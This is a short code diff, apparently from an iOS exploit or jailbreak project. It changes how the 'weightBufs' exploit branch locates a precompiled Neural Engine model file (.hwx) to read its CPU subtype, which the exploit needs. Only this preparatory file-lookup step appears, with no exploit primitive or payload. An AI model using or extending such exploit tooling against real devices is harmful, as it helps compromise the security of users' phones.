@@ -91,8 +91,7 @@ int main(int argc, char *argv[], char *envp[]) {
 					NSLog(@"exploiting using weightBufs");
 
 					// Find some precompiled model and get the cpusubtype of it because we need it in the exploit
-					// Accessing this path is only possible thanks to several entitlements
-					NSURL* anedCrap = [NSURL fileURLWithPath:@"/var/mobile/Library/Caches/com.apple.aned"];
+					NSURL* anedCrap = [NSURL fileURLWithPath:@"/System/Library/ImagingNetworks"];
 					NSDirectoryEnumerator<NSURL*>* enumerator = [[NSFileManager defaultManager] enumeratorAtURL:anedCrap 
                          includingPropertiesForKeys:nil 
                                             options:0 
@@ -100,7 +99,7 @@ int main(int argc, char *argv[], char *envp[]) {
 					NSURL* file;
 					while(file = [enumerator nextObject])
 					{
-						if([file.lastPathComponent isEqualToString:@"model.hwx"])
+						if([file.pathExtension isEqualToString:@"hwx"])
 						{
 							struct mach_header header;
 							FILE* f = fopen(file.fileSystemRepresentation, "r");
